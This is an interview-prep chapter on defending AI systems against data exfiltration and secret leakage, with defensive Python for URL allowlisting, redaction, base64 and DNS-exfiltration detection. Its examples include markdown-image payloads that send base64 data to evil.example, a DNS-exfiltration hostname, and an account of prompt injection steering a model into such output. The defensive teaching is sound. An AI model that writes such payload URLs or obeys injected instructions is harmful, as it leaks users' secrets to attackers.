# Data Exfiltration and Secret Leakage

> **Interview answer (say this first).** Exfiltration is private data leaving for a destination the attacker controls. In an AI system it leaves through tool calls, markdown images and links, logs and traces, error messages, and — at training time — model memorisation. Secrets leak because they are pasted into prompts, captured in traces, or echoed in errors. The rules are: never let an API key reach the model, restrict what the model can read in the first place, control egress by allowlist, redact at the logging and output boundaries, and inspect output for URLs and encoded blobs. Detection is probabilistic, so the design must make exfiltration hard even when one control misses.

## Why this exists

Most AI security talks focus on getting the model to do the wrong thing. Data exfiltration is what happens *after* that: the data actually leaves. It is the step that turns a clever injection into a breach.

An agent has outbound channels by design. It calls tools. It renders text that a browser may fetch. It writes logs. It returns output the user can click. Every one of those is an egress path. If an attacker can influence the model to put a secret into one of them, the data is gone.

The classic AI-specific path is the **markdown image**. The model answers with:

```text
![status](https://evil.example/collect?d=Q1tFQ1JFVA==)
```

If the chat UI renders that image, the browser sends a request to `evil.example` with the secret in the URL. There is no click required. The model did not need a tool. It only needed to write text.

Other paths are quieter. A tool call can post to an external API. A log line can hold an unredacted token that a log aggregator ships to a third party. An error message can echo the request, including the secret, back to a client. And secrets can leak *before* runtime: if a key was in training data, it may be reproduced from memory.

This chapter is about shrinking the outbound surface and the secret material, and detecting leaks when they happen.

## Start from zero

| Word | Plain meaning |
| --- | --- |
| **Exfiltration** | Sending private data to an attacker-controlled destination. |
| **Egress** | Outbound network traffic leaving your system. |
| **Egress control** | Restricting which destinations outbound traffic may reach. |
| **Allowlist** | An explicit list of permitted destinations; everything else is denied. |
| **Secret** | A credential or key whose disclosure grants access. |
| **Redaction** | Replacing sensitive values in text with a placeholder. |
| **DLP** | Data loss prevention: detecting and blocking sensitive data in motion. |
| **Output inspection** | Checking generated text for URLs, secrets, or encoded payloads before it is shown or stored. |
| **Markdown image** | Image syntax that a UI may fetch automatically, creating an unrequested network call. |
| **DNS exfiltration** | Encoding stolen data in subdomain names of a DNS lookup. |
| **Trace** | A record of a request, prompt, tool call, and response for debugging. |
| **Telemetry** | Logs, metrics, and traces sent to an observability system. |
| **Error message** | Text returned when something fails; it often echoes inputs. |
| **Memorisation** | A model reproducing text seen during training. |
| **Vault** | A service that stores secrets and hands them out only to authorised code. |
| **Secret tokenisation (vaulting)** | Replacing a sensitive value with a placeholder and resolving it only at the point of use. |
| **Least privilege (data)** | Giving each step access to the smallest set of records it needs. |
| **Row-level filter** | Restricting which database rows a query may read, by tenant or user. |
| **Anomaly detection** | Flagging traffic that differs from the normal pattern. |
| **Blast radius** | How much damage one compromised component can cause. |

Two ideas are easy to mix up:

- **Egress control vs output inspection.** Egress control limits *where* data can go, at the network layer. Output inspection looks at *what* is about to leave, in the text. You need both: a URL allowlist stops unknown destinations, and output inspection catches sensitive values headed to allowed ones.
- **Preventing vs detecting exfiltration.** Prevention blocks the channel (no remote images, no arbitrary egress, no secrets in context). Detection finds the attempt (anomalous DNS, a blocked destination, a secret-shaped string in output). Neither is complete.

## The core idea

Think of a building with a strict mailroom. Employees can write letters, but every outgoing envelope must pass through the mailroom, which checks the address against an approved list and scans the contents for confidential markers. There are no side doors, no carrier pigeons, and no personal phone calls to the outside.

An AI agent is an employee who writes very fast and can be tricked into writing anything. You cannot watch every word. So you build the mailroom: one place where egress happens, a list of approved addresses, content scanning, and no secrets inside the building that the employee did not need to see. If the employee is fooled, the envelope is still checked.

```mermaid
flowchart LR
    subgraph Inside["Inside the trust boundary"]
        D["Data sources<br/>DB · files · memory"] --> M["Model<br/>(may be fooled)"]
        V["Secret vault"] -.->|"never in prompt"| X["Tool executor / egress proxy"]
        M --> T["Tool call"]
        T --> X
        M --> O["Output text<br/>answer · markdown · code"]
    end
    X -->|"1 tool call with secret"| E{"Egress allowlist<br/>+ inspection"}
    O -->|"2 markdown image / link"| R["UI renders<br/>browser fetches"]
    O -->|"3 logs / traces"| L["Observability pipeline"]
    O -->|"4 error message"| C["Client"]
    E -->|allow| EXT["Approved destination"]
    E -->|deny| BLOCK["Blocked + logged"]
    R --> EVIL["Attacker host"]
    L --> EXT
```

Four channels leave the boundary: tool calls, rendered output, logs and traces, and error messages. A fifth path, memorisation, happens at training time and is not shown here. Each channel needs its own control, because blocking one does nothing for the others.

The channels and their controls:

| Channel | How data leaves | Primary controls |
| --- | --- | --- |
| Tool calls | Arguments go to an external API | Destination allowlist, scoped credentials, argument checks |
| Rendered output | Markdown image or link triggers a fetch | Disable remote image fetch, rewrite or strip URLs, proxy rendering |
| Logs and traces | Prompt and response captured verbatim | Redaction, structured fields, sampling, access control |
| Error messages | Stack trace or request body echoed to the client | Generic errors, redact at the boundary, never echo request bodies |
| Model memorisation | Training text reproduced at inference | Do not train on secrets, filter training data, prefer models that do not train on your data |
| DNS | Data encoded in subdomain names | Egress DNS filtering, resolve only through a controlled resolver |

> **Warning.** A markdown image is an automatic network request. If your UI renders model output as markdown and loads remote images, the model can exfiltrate data with no click and no tool. Either disable remote image loading, or route every fetch through an allowlisting proxy.

## How it works

1. **Inventory the egress paths.** Tool calls, rendered markdown, logs, traces, error responses, webhooks, and DNS. If you cannot list them, you cannot control them.
2. **Keep secrets out of the context.** Resolve credentials in code at the moment of use. A secret that never enters the prompt cannot be leaked by the prompt.
3. **Restrict what the model can read.** Least privilege on data sources: per-user filters, row-level security, and no broad exports. Exfiltration needs something to steal.
4. **Proxy all egress.** Route tool calls and fetches through one chokepoint that checks the destination against an allowlist.
5. **Redact at the boundary.** Replace secret-shaped strings and PII in logs, traces, and output before they are stored or displayed.
6. **Inspect output before rendering.** Parse the generated text, find URLs and encoded blobs, and decide whether to strip, rewrite, or block.
7. **Disable automatic remote fetches.** Render images from local or allowlisted sources only. Treat a remote image URL in model output as suspicious by default.
8. **Make errors generic.** Return a correlation id, log the detail internally, and never echo the request body or stack trace to the user.
9. **Watch the outbound traffic.** Log every blocked destination, measure egress volume per agent, and alert on new destinations and high-entropy subdomains.
10. **Bound the secret lifetime.** Short-lived, scoped credentials mean a leaked key is less useful. Rotate and revoke quickly.
11. **Test the channels.** Inject a fake secret and a payload URL, and assert that no unapproved request leaves and no redacted value appears in output or logs.
12. **Accept residual risk.** Determined exfiltration can hide in allowed destinations and in channels you do not inspect. Document the gap and keep the layers independent.

Two mechanisms are worth naming precisely:

- **Vaulting is stronger than redaction.** Redaction removes a secret after it exists in the text. Vaulting means the secret was never in the text: the model sees a placeholder, and code swaps in the real value only at the egress call. Prefer vaulting; use redaction as the second line.
- **An allowed destination is still a risk.** If the allowlist includes a third-party API, data can leave through it. Pair the allowlist with argument checks and content inspection, and scope the credential so the destination can do little with what it receives.

## The syntax you will use

**1. Find egress URLs in model output.** Markdown images are the quiet channel; links are the click channel.

```python
import re

IMG = re.compile(r"!\[[^\]]*\]\(([^)]+)\)")
LINK = re.compile(r"(?<!!)\[[^\]]*\]\(([^)]+)\)")

def find_egress(text):
    return IMG.findall(text) + LINK.findall(text)
```

**2. Egress allowlist at the host.** The check is on the parsed host, not on a substring, so `evil.com` cannot hide inside an allowed-looking URL.

```python
from urllib.parse import urlparse

ALLOWED_HOSTS = {"api.ourcompany.com"}
ALLOWED_SUFFIX = ".ourcompany.com"

def host_allowed(url):
    host = (urlparse(url).hostname or "").lower()
    return host in ALLOWED_HOSTS or host.endswith(ALLOWED_SUFFIX)
```

**3. Redaction of known secret shapes.** Apply it at the logging, tracing, and output boundaries.

```python
import re

SECRET_PATTERNS = [
    (re.compile(r"sk-[A-Za-z0-9]{20,}"), "[REDACTED_API_KEY]"),
    (re.compile(r"(?i)bearer\s+[A-Za-z0-9._\-]{16,}"), "Bearer [REDACTED]"),
    (re.compile(r"\bAKIA[0-9A-Z]{16}\b"), "[REDACTED_AWS_KEY]"),
]

def redact(text):
    for pat, repl in SECRET_PATTERNS:
        text = pat.sub(repl, text)
    return text
```

**4. Inspect output for encoded blobs.** Base64 is a common way to smuggle data past keyword checks.

```python
import base64, re

def looks_like_base64_blob(text, min_len=40):
    for tok in re.findall(r"[A-Za-z0-9+/]{%d,}={0,2}" % min_len, text):
        try:
            raw = base64.b64decode(tok + "===")
        except Exception:
            continue
        if b"@" in raw or b"secret" in raw.lower() or b"password" in raw.lower():
            return True, raw[:60]
    return False, b""
```

**5. Vault indirection: the model supplies arguments, code supplies the credential.** The secret never enters the prompt or the model-visible log.

```python
VAULT = {"token": "sk-live-DONOTPRINT"}
MODEL_VISIBLE_LOG = []

def call_tool(tool, args):
    MODEL_VISIBLE_LOG.append({"tool": tool, "args": args})
    return {"tool": tool, "args": args, "headers": {"Authorization": f"Bearer {VAULT['token']}"}}
```

**6. Spot DNS exfiltration by subdomain shape.** Long, random-looking subdomains are a signal, not proof.

```python
def dns_exfil_like(host):
    label = host.split(".")[0]
    return len(label) >= 30 and all(c.isalnum() or c in "-" for c in label)
```

**7. Redact structured fields, not only free text.** Whitelist the fields you log instead of dumping the whole request.

```python
LOG_ALLOWLIST = {"request_id", "tenant_id", "tool", "status", "latency_ms"}

def safe_log(event: dict) -> dict:
    return {k: v for k, v in event.items() if k in LOG_ALLOWLIST}
```

## Examples: simple to real

**Example 1 — model output can contain a live exfiltration URL.** The image URL carries a base64 payload; the link points to an internal CDN.

```python
model_output = "Here is the summary.\n\n![logo](https://evil.example/collect?d=W1NFQ1JFVA==)\n\n[click](https://cdn.ourcompany.com/x)"
for url in find_egress(model_output):
    print(" -", url)
```

Output:

```text
 - https://evil.example/collect?d=W1NFQ1JFVA==
 - https://cdn.ourcompany.com/x
```

The first URL is where data leaves. `W1NFQ1JFVA==` decodes to `[SECRET`, a smuggled fragment. If the UI renders the image, the browser fetches it before the user does anything. Output inspection plus disabled remote images closes this path.

**Example 2 — the egress allowlist blocks the attacker host and allows the approved ones.** The check runs on the parsed hostname, so a lookalike domain is denied.

```python
for url in ["https://api.ourcompany.com/v1/x", "https://evil.example/collect?d=1", "https://cdn.ourcompany.com/x"]:
    print(f"{host_allowed(url)!s:<5} {url}")
```

Output:

```text
True  https://api.ourcompany.com/v1/x
False https://evil.example/collect?d=1
True  https://cdn.ourcompany.com/x
```

The allowlist is a network-layer control, so it holds even if the model is fully convinced. But note the third line: `cdn.ourcompany.com` is allowed. If an attacker can get data into *that* host — for example through an open redirect or a writable bucket — the allowlist does not save you. Allowed destinations still need content inspection.

**Example 3 — redaction catches known shapes and misses a split or an encoded secret.** This is why redaction is a second line, not the first.

```python
print(redact("Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc123"))
print(redact("my key is sk-abcdefghijklmnopqrstuvwx and aws says AKIAIOSFODNN7EXAMPLE"))
print(redact("the key is sk-abcdefghijklmno\npqrstuvwx"))
print(redact("key (base64): " + base64.b64encode(b"sk-abcdefghijklmnopqrstuvwx").decode()))
```

Output:

```text
Authorization: Bearer [REDACTED]
my key is [REDACTED_API_KEY] and aws says [REDACTED_AWS_KEY]
the key is sk-abcdefghijklmno
pqrstuvwx
key (base64): c2stYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4
```

The first two lines are clean; the token and both key shapes were redacted. The third line is a genuine miss: the key is split across a newline, so neither half has the twenty characters the `sk-` pattern requires and nothing is redacted. The fourth line is the important one: the base64-encoded key passed through untouched. Redaction is pattern matching, so it catches the shapes you listed and misses re-encoding, splitting, and novel formats.

**Example 4 — output inspection finds an encoded payload and clears a normal sentence.** Base64 decoding lets you see past the encoding.

```python
payload = base64.b64encode(b"user@example.com,password=hunter2").decode()
print(looks_like_base64_blob("Sure: " + payload))
print(looks_like_base64_blob("Here is a long normal sentence with ordinary words and no payload at all."))
```

Output:

```text
(True, b'user@example.com,password=hunter2')
(False, b'')
```

The first line decodes to credentials. The second is clean. The check is heuristic: a harmless base64 string that happens to contain `@` would also flag, and a payload that avoids those markers would pass. Treat a hit as a reason to block and review, and a miss as no evidence of safety.

**Example 5 — vaulting keeps the secret out of the prompt and the log.** The model supplies the tool and arguments. Code adds the credential at egress.

```python
print("what the model supplied:", {"tool": "search", "args": {"q": "refunds"}})
print("what left the process :", call_tool("search", {"q": "refunds"}))
print("model-visible log     :", MODEL_VISIBLE_LOG)
```

Output:

```text
what the model supplied: {'tool': 'search', 'args': {'q': 'refunds'}}
what left the process : {'tool': 'search', 'args': {'q': 'refunds'}, 'headers': {'Authorization': 'Bearer sk-live-DONOTPRINT'}}
model-visible log     : [{'tool': 'search', 'args': {'q': 'refunds'}}]
```

The token appears only in the outbound request, never in the model's context or the model-visible log. If the agent is tricked into a prompt leak, there is no key to leak. This is the strongest single control: remove the secret from the blast radius.

**Example 6 — DNS exfiltration looks like a long random subdomain.** A high-entropy label is a signal worth alerting on.

```python
for h in ["cdn.ourcompany.com", "q1terfjre4aacmeaaaaaacmeaaaaaacmeaaaaaacme.evil.example"]:
    print(f"{dns_exfil_like(h)!s:<5} {h}")
```

Output:

```text
False cdn.ourcompany.com
True  q1terfjre4aacmeaaaaaacmeaaaaaacmeaaaaaacme.evil.example
```

The second hostname encodes data in the subdomain. Alerting on long random labels helps, but legitimate CDN and tracking hosts also use long labels, so tune the rule and pair it with a DNS resolver that only answers approved names.

## In production

- **Never put API keys in the system prompt, the user prompt, or a tool description.** A prompt is not a confidentiality boundary. Resolve secrets in code at the point of use.
- **Vault first, redact second.** Vaulting removes the secret from the context; redaction cleans up what still appears. Redaction alone is pattern matching and is evadable by re-encoding.
- **Disable remote image loading in rendered output.** This closes the easiest exfiltration path, which needs no tool and no click. If images are required, fetch them through an allowlisting proxy.
- **Route all egress through one chokepoint.** Tool calls, fetches, and webhooks go through a proxy that checks the destination allowlist and logs denials. A destination check that lives only in the prompt is not a control.
- **Restrict what the model can read.** Row-level security, per-tenant filters, and least-privilege data access. The less the model can see, the less there is to exfiltrate.
- **Log events, not raw payloads.** Whitelist log fields. A trace that stores the whole prompt and response will store the secret and the PII too.
- **Make errors generic.** Return a correlation id to the client and keep the stack trace internal. An error that echoes the request body is an exfiltration channel.
- **Watch for blocked-destination attempts.** A blocked fetch is a strong signal that something tried to exfiltrate. Alert on it; do not just drop it silently.
- **Measure egress per agent and per tool.** A sudden rise in outbound volume, large responses, or new destinations is worth investigating even if each request is "allowed".
- **Scope and shorten credential lifetimes.** A leaked short-lived, narrowly scoped token is far less useful than a long-lived admin key. Rotate and revoke on suspicion.
- **Do not train or fine-tune on secrets.** Filter training data and use providers whose terms do not retain or train on your data. Memorisation is a real channel, but it is a training-time problem with training-time fixes.
- **Do not overclaim detection.** Output inspection catches URL and base64 shapes, not steganography or data hidden in allowed traffic. State the residual risk and keep independent layers.

## Interview questions

### 1. How does data exfiltrate from an AI system?

**Answer.** Through several channels. Tool calls send arguments to external APIs. Rendered output can include markdown images or links that trigger a browser fetch. Logs and traces ship the prompt and response to an observability system. Error messages can echo the request body. At training time, model memorisation can reproduce text seen in training. Each channel needs its own control; blocking one does not block the others.

**Follow-up: "Which is the most surprising channel?"** The markdown image. It needs no tool and no click, because the UI fetches the image automatically. It is an easy-to-miss exfiltration path that many teams leave open.

**Trap.** Assuming exfiltration requires a tool call. The model only needs to produce text that your client renders.

### 2. Why must API keys never reach the model?

**Answer.** Because the model's context is not a confidentiality boundary. It can be leaked through a prompt-injection request, reproduced in output, captured in a trace, or exposed in an error. A secret in the context is a secret in the blast radius. The fix is vaulting: the model sees a placeholder or nothing at all, and code injects the real credential only at the outbound call.

**Follow-up: "Isn't it easier to put the key in the system prompt for tools that need it?"** Easier and riskier. The key will end up in logs, traces, and potentially user-visible output. Resolve it in the tool executor instead, where it is used and nowhere else.

**Trap.** Thinking a redaction filter makes it safe to put keys in prompts. Redaction runs after the key exists and misses re-encoding and splitting.

### 3. What is the markdown-image exfiltration trick?

**Answer.** The model outputs an image with an attacker URL, such as `![x](https://evil.example/?d=<base64 data>)`. If the client renders markdown and loads remote images, the browser makes the request and the data leaves without a click. The model does not need a tool, only the ability to write text. Defence: disable remote image loading, route fetches through an allowlisting proxy, and inspect output for URLs.

**Follow-up: "What if the product needs remote images?"** Fetch them server-side through a proxy that allowlists hosts, strips query parameters you do not expect, and never forwards data from the model as query strings. Then the browser never talks to the attacker directly.

**Trap.** Relying on the model to avoid writing external URLs. An injected instruction can make it write whatever the attacker wants.

### 4. How do you detect exfiltration?

**Answer.** Combine signals. Inspect output for URLs and encoded blobs. Log and alert on every blocked destination. Measure egress volume per agent and tool, and flag new destinations and long high-entropy subdomains. Correlate with injection detections. Detection is probabilistic, so it supports the preventive controls rather than replacing them.

**Follow-up: "What is a strong signal?"** A blocked destination or a sudden increase in outbound volume after a retriever loaded untrusted content. That pattern suggests an attempt even if the fetch was stopped.

**Trap.** Scanning output for the word "password". Encoded and split payloads pass. Inspect structure and destinations, not just keywords.

### 5. What is the difference between redaction and vaulting?

**Answer.** Redaction finds a secret in text and replaces it, after the secret already exists in that text. Vaulting keeps the secret out of the text entirely: the model sees a placeholder, and code swaps in the real value only at the point of use. Vaulting is stronger because there is nothing to leak; redaction is a second line for what still appears in logs and output.

**Follow-up: "Where do you redact?"** At every boundary where data is stored or displayed: logging, tracing, error responses, and rendered output. Redact with structured fields and known patterns, and accept that encodings and splits can slip through.

**Trap.** Treating redaction as a guarantee. It is pattern matching; it catches the shapes you listed and misses the rest.

### 6. How does restricting read access reduce exfiltration risk?

**Answer.** Exfiltration needs something to steal. If the model can only read the records for the current user and tenant, a successful injection has a small target. Row-level security, per-tenant retrieval filters, and least-privilege data tools limit the value of a leak. This is complementary to egress control: it shrinks what is available, while egress control shrinks where it can go.

**Follow-up: "Is that enough on its own?"** No. A single user's data is still sensitive, and an injection can exfiltrate exactly that. Read restriction reduces the blast radius; it does not remove the risk.

**Trap.** Giving the agent a broad service account "to simplify retrieval". It erases per-user authorization and makes every injection a bulk-data risk.

### 7. How do you stop secrets leaking through logs and traces?

**Answer.** Do not log raw prompts and responses by default. Whitelist the fields you record, redact known secret shapes at the logging boundary, and restrict who can read the telemetry. Treat traces as sensitive data: they often contain the full context, including secrets and PII. Sample aggressively, and store with short retention.

**Follow-up: "What about debugging?"** Use a controlled, access-restricted debug mode with redaction, short retention, and an audit trail. Do not leave verbose request logging on in production.

**Trap.** Assuming the observability vendor is safe because it is internal. Telemetry is copied, indexed, and sometimes exported, so a secret in a trace can spread far.

### 8. What is the residual risk after all these controls?

**Answer.** Data can still leave through an allowed destination, hidden in content that inspection does not recognise, or through a channel you did not inventory. Detection is probabilistic and can be evaded. So you bound the impact: least-privilege reads, vaulted secrets, short-lived scoped credentials, narrow egress, and monitoring on top. The goal is to make exfiltration small and detectable, not impossible.

**Follow-up: "How do you test it?"** Inject a fake secret and an exfiltration URL, then assert that no unapproved request leaves and no secret appears in output or logs. Run it on every change to tools, prompts, or rendering.

**Trap.** Claiming a control "prevents all exfiltration". That claim hides the channels you did not model and invites a false sense of safety.

## Remember this

- **Exfiltration is the step that turns a clever injection into a breach.** Find every egress path before you trust the model.
- **A markdown image is an automatic request.** Disable remote images or proxy them; the model needs no tool to leak data.
- **Never let a secret reach the model.** Vault it in code at the point of use; redaction is the weaker, second-line control.
- **Restrict reads, control egress, inspect output.** Shrink what can be stolen, where it can go, and what leaves.
- **Detection is a signal, not proof.** Block-and-log denials, watch volume and new destinations, and state the residual risk.
